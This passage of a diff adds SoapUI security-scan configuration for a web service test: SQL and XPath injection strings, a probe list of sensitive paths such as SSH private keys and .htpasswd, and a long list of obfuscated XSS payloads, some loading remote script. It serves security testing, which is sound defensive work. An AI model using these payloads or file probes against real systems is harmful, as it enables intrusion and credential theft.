+      <con:executionStrategy xsi:nil="true" immutable="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ALL_AT_ONCE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="InvalidTypesSecurityScan" name="Invalid Types" id="3ba8d73b-2a8b-4101-a37c-b116bd8aa170" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:InvalidSecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:typesList>
+          <con:type>3</con:type>
+          <con:value>true</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>4</con:type>
+          <con:value>GpM7</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>5</con:type>
+          <con:value>0FB7</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>9</con:type>
+          <con:value>-1E4f</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>10</con:type>
+          <con:value>12.45E+12</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>11</con:type>
+          <con:value>-1.23</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>12</con:type>
+          <con:value>SoapUI is	 the
+ best</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>13</con:type>
+          <con:value>P1Y2M3DT10H30M12.3S</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>14</con:type>
+          <con:value>1999-05-31T13:20:00.000-05:00</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>16</con:type>
+          <con:value>1999-05-31</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>22</con:type>
+          <con:value>-1267896799</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>23</con:type>
+          <con:value>-882223334991111111</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>24</con:type>
+          <con:value>-2147483647</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>25</con:type>
+          <con:value>-32768</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>26</con:type>
+          <con:value>127</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>27</con:type>
+          <con:value>0</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>28</con:type>
+          <con:value>-1</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>29</con:type>
+          <con:value>1</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>30</con:type>
+          <con:value>1267896799</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>31</con:type>
+          <con:value>882223334991111111</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>32</con:type>
+          <con:value>294967295</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>33</con:type>
+          <con:value>65535</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>34</con:type>
+          <con:value>255</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>35</con:type>
+          <con:value>SoapUI is the best</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>36</con:type>
+          <con:value>SoapUI is the best</con:value>
+        </con:typesList>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="c54173f2-c1c7-42de-bf4e-6b5eb773087c" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="buystring" parameterName="buystring" xpath="" checked="true"/>
+        <con:parameters label="sessionid" parameterName="sessionid" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="SQLInjectionScan" name="SQL Injection" id="b4ab0cb7-25ed-4507-8d77-dd3d60bd9fdf" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:SQLInjectionScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:sqlInjectionStrings>' or '1'='1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>/*!10000%201/0%20*/</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>/*!10000 1/0 */</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1/0</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'%20o/**/r%201/0%20--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' o/**/r 1/0 --</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>;</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'%20and%201=2%20--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' and 1=2 --</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>test� UNION select 1, @@version, 1, 1;�</con:sqlInjectionStrings>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="b43ae38d-0f00-498d-b031-b89c7b1912d2" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="buystring" parameterName="buystring" xpath="" checked="true"/>
+        <con:parameters label="sessionid" parameterName="sessionid" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="XPathInjectionSecurityScan" name="XPath Injection" id="0ed96777-b143-4647-a3ce-902f67397692" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:XPathInjection" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:xpathList>or name(//users/LoginID[1]) = 'LoginID' or 'a'='b</con:xpathList>
+        <con:xpathList>' or '1'='1</con:xpathList>
+        <con:xpathList>1/0</con:xpathList>
+        <con:xpathList>'%20o/**/r%201/0%20--</con:xpathList>
+        <con:xpathList>' o/**/r 1/0 --</con:xpathList>
+        <con:xpathList>;</con:xpathList>
+        <con:xpathList>'%20and%201=2%20--</con:xpathList>
+        <con:xpathList>' and 1=2 --</con:xpathList>
+        <con:xpathList>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:xpathList>
+        <con:xpathList>test� UNION select 1, @@version, 1, 1;�</con:xpathList>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="3ee9d819-29c3-4284-8877-3ed0ceb61c73" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="buystring" parameterName="buystring" xpath="" checked="true"/>
+        <con:parameters label="sessionid" parameterName="sessionid" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityProScan type="HttpMethodFuzzingScan" name="HTTP Method Fuzzing" id="62a317e0-139c-4718-8476-60627a878c8c" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:HttpMethodFuzzingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:deselectedMethods/>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="d15933ca-5984-4955-bac4-bc85a4c9a5b9" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:assertion type="Valid HTTP Status Codes" id="fe8179ca-291d-4cc4-8fc2-e2c315e7a221" name="Valid HTTP Status Codes">
+        <con:settings>
+          <con:setting id="__LEVEL_">WARNING</con:setting>
+        </con:settings>
+        <con:configuration>
+          <codes>501,405,403</codes>
+        </con:configuration>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityProScan>
+    <con:testStepSecurityProScan type="SensitiveFileSecurityScan" name="Sensitive Files Exposure" id="08b94ac2-390a-4738-966d-04063431486c" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:SensitiveFileSecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/known_hosts"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/authorized_keys"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa.bak"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa.old"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa~"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa.bak"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa.old"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa~"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess.bak"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess.old"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/htaccess.txt"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess~"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd.bak"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd.old"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd~"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.bash_history"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.bashrc"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.history"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.profile"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.mysql_history"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/~root"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/config"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/HEAD"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/index"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.svn/entries"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.svn/wc.db"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/pccsmysqladm/incs/dbconnect.inc"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/perl/"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/phpBB/phpinfo.php"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/weblogic"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/wp-admin/wp-login.php"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/wp-content/debug.log"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/WEB-INF/web.xml"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/iisadmin/"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/iissamples/"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.jsp"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.php"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html.bak"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html.old"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html~"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/manager"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/config/database.yml"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/config/initializers/secret_token.rb"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/db/seeds.rb"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/db/development.sqlite3"/>
+      </con:config>
+      <con:assertion type="Sensitive Files Exposure Assertion" id="337241d1-7e46-44f0-b02f-ef8d7995752b" name="Sensitive Files Exposure"/>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityProScan>
+    <con:testStepSecurityProScan type="WeakAuthenticationScan" name="Weak Authentication" id="9e21106b-8667-4f41-8dbb-8af44934f662" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:assertion type="WeakPassword" id="b2ef1f50-99d1-438c-b3ae-3263880cbd17" name="Weak Password Detection">
+        <con:configuration/>
+      </con:assertion>
+      <con:assertion type="BasicAuth" id="982cfcc4-f117-4ca5-a8c2-46a870736b42" name="Basic Authentication Detection"/>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityProScan>
+  </con:testStepSecurityTest>
+  <con:testStepSecurityTest>
+    <con:testStepId>3d09394d-f9db-48d3-aa7c-fa0869a0f163</con:testStepId>
+    <con:testStepSecurityScan type="BoundaryScan" name="Boundary Scan" id="fb449b09-d6ba-46df-afb3-3780389cbd75" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:assertion type="Sensitive Information Exposure" id="e27d2ef3-cc93-44f8-832c-23db5904951a" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="sessionid" parameterName="sessionid" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="CrossSiteScriptingScan" name="Cross Site Scripting" id="b0031d6c-92f1-4bf1-8735-7371b0120c86" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:CrossSiteScriptingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameterExposureStrings>&lt;PLAINTEXT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>">'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>'';!--"&lt;XSS>=&amp;{()}</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js>&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert('XSS')></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=JaVaScRiPt:alert('XSS')></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG """>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav	ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")>";' > out</con:parameterExposureStrings>
+        <con:parameterExposureStrings>perl -e 'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";' > out</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT/XSS SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT/SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js?&lt;B></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC=//ha.ckers.org/.j></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS')"</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;iframe src=http://soapui.org/scriptlet.html &lt;</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>\";alert('XSS');//</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BODY BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BODY ONLOAD=alert('XSS')></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG DYNSRC="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG LOWSRC="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BGSOUND SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BR SIZE="&amp;{alert('XSS')}"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;LAYER SRC="http://soapui.org/scriptlet.html">&lt;/LAYER></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="http://soapui.org/xss.css"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>@import'http://soapui.org/xss.css';&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Link" Content="&lt;http://soapui.org/xss.css>; REL=stylesheet"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>BODY{-moz-binding:url("http://soapui.org/xssmoz.xml#xss")}&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;XSS STYLE="behavior: url(xss.htc);"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE>&lt;UL>&lt;LI>XSS</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC='vbscript:msgbox("XSS")'></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="mocha:[code]"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="livescript:[code]"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>ï¿½scriptï¿½alert(ï¿½XSSï¿½)ï¿½/scriptï¿½</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;TABLE BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="width: expression(alert('XSS'));"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;XSS STYLE="xss:expression(alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE TYPE="text/javascript">alert('XSS');&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE>&lt;A CLASS=XSS>&lt;/A></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;!--[if gte IE 4]>&lt;SCRIPT>alert('XSS');&lt;/SCRIPT>&lt;![endif]--></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BASE HREF="javascript:alert('XSS');//"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://soapui.org/scriptlet.html">&lt;/OBJECT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>&lt;param name=url value=javascript:alert('XSS')>&lt;/OBJECT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;EMBED SRC="http://soapui.org/xss.swf" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings>
+        <con:parameterExposureStrings>a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);</con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]]]>><![CDATA[<![CDATA[cript:alert('XSS');">]]]]>><![CDATA[</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC="http://soapui.org/xss.jpg">&lt;/SCRIPT></con:parameterExposureStrings>
